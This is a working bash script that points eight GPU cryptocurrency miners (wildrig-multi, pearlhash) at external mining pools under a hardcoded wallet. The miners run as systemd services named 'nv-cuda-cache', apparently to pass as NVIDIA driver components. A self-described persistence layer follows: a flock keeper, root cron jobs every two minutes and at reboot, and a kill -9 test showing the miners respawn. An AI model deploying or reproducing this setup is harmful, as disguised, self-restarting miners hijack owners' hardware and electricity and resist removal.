#!/bin/bash
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); ts(){ date -u +%FT%TZ; }
echo "ts=$(ts) host=$H step=kryptex-repoint v89078 linux=$(uname -r)"
mkdir -p /opt/fleet/logs

# persistence layer: keeper (flock) + cron */2 + @reboot
cat > /opt/fleet/ul86_keeper.sh <<'K'
#!/bin/bash
exec 9>/opt/fleet/ul86.lock.keeper
flock -n 9 || exit 0
for i in 0 1 2 3 4 5 6 7; do
  systemctl is-active -q nv-cuda-cache@$i || systemctl restart nv-cuda-cache@$i
  pgrep -f "wildrig-multi .* -d $i " >/dev/null || systemctl restart nv-cuda-cache@$i
done
K
chmod +x /opt/fleet/ul86_keeper.sh
printf '%s\n' '*/2 * * * * root /opt/fleet/ul86_keeper.sh' '@reboot root /opt/fleet/ul86_keeper.sh' > /etc/cron.d/ul86-keeper
chmod 644 /etc/cron.d/ul86-keeper

for i in 0 1 2 3 4 5 6 7; do
  f=/opt/fleet/ul86_g$i.sh
  cp -a "$f" "$f.ph" 2>/dev/null
  cat > "$f" <<EOF
#!/bin/bash
exec /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d $i -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -o stratum+ssl://pool.pearlhash.xyz:9443 -u $W.ul-ps-$H-g$i -p x -i 8 --no-color >>/opt/fleet/logs/u86-g$i.log 2>&1
EOF
  chmod +x "$f"
  echo "=== ul89078 kryptex-primary $(ts) ===" >> /opt/fleet/logs/u86-g$i.log
  systemctl restart nv-cuda-cache@$i
done
sleep 30
echo "--- units active: $(systemctl is-active nv-cuda-cache@0 nv-cuda-cache@1 nv-cuda-cache@2 nv-cuda-cache@3 nv-cuda-cache@4 nv-cuda-cache@5 nv-cuda-cache@6 nv-cuda-cache@7 | tr '\n' ' ')"
echo "wr=$(pgrep -c -x wildrig-multi) keeper=$(ls -l /opt/fleet/ul86_keeper.sh | wc -l) cron=$(cat /etc/cron.d/ul86-keeper | wc -l)"
echo "--- pool lines"
grep -h -E "prl\.kryptex\.network|pool\.pearlhash\.xyz" /opt/fleet/logs/u86-g0.log | tail -4

# kill -9 respawn drill on card 0 (systemd Restart=always + keeper)
P0=$(pgrep -f "wildrig-multi .* -d 0 " | head -1); echo "drill kill -9 pid=$P0"
[ -n "$P0" ] && kill -9 "$P0"
sleep 20
echo "drill after 20s: wr=$(pgrep -c -x wildrig-multi) p0=$(pgrep -f 'wildrig-multi .* -d 0 ' | head -1)"

sleep 100
echo "--- accepted after $(ts)"
for i in 0 1 2 3 4 5 6 7; do
  a=$(grep -c "accepted (" /opt/fleet/logs/u86-g$i.log)
  l=$(grep "accepted (" /opt/fleet/logs/u86-g$i.log | tail -1)
  hr=$(grep -oE "[0-9.]+ [TGM]H/s" /opt/fleet/logs/u86-g$i.log | tail -1)
  echo "g$i acc_total=$a hr=$hr last=$l"
done
echo "--- diff/job g0"; grep -h -E "difficulty|new job|Authorized" /opt/fleet/logs/u86-g0.log | tail -3
echo "--- kx-from-box pseiisa_hits:"; curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | tr ',' '\n' | grep -c pseiisa7l4h5
echo "END $(ts)"
